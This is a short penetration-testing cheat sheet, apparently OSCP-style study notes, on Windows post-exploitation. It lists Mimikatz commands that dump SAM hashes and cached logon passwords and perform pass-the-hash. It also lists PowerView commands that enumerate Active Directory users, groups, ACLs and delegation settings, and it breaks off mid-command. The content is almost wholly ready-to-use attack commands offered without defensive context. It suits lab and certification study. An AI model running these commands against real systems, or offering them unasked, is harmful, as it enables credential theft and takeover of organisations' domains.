# Post Exploitation

## Mimikatz

Post exploitation commands must be executed from SYSTEM level privileges.

```
mimikatz # privilege::debug
mimikatz # token::whoami
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords

# Pass The Hash
mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
```

## AD - PowerView

```bash

https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/

# Basic Domain Information
Get-NetDomain

#User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired
Get-NetUser -SPN

#Groups Information
Get-NetGroup | select samaccountname,description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName

#Computers Information
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname 
Get-NetComputer -TrustedToAuth | select samaccountname
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*
```